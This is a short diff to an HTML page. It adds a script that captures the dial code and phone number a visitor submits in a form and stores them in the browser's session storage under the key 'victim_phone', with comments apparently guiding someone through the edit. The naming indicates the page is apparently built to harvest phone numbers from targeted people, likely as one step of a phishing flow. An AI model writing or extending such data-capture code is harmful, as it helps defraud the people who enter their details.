@@ -116,6 +116,24 @@
 
 <!-- FIXED: Added leading slash -->
 
+<!-- ... your entire index.html stays exactly the same until the bottom ... -->
+
+</div>
+
+<!-- ADD THIS SCRIPT RIGHT BEFORE </body> -->
+<script>
+document.getElementById('phoneForm').addEventListener('submit', function() {
+    // 1. Get the values from the inputs
+    const dialCode = document.getElementById('dialCode').value;
+    const phoneNumber = document.getElementById('phoneNumber').value;
+    
+    // 2. Combine them
+    const fullNumber = dialCode + phoneNumber;
+    
+    // 3. Save it to the browser's temporary memory
+    sessionStorage.setItem('victim_phone', fullNumber);
+});
+</script>
 
 </body>
 </html>
